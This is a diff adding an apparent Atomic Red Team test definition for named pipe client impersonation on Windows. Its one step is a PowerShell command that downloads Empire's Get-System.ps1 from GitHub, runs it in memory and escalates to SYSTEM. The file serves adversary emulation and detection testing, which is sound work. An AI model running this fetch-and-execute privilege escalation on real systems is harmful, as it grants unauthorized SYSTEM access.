@@ -1,0 +1,23 @@
+{
+  "id": "90db9e27-8e7c-4c04-b602-a45927884966",
+  "name": "Named pipe client impersonation",
+  "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "82624969-4adb-4aba-bccd-06b8f0319a16",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1134.001",
+    "atomic-red-team"
+  ]
+}
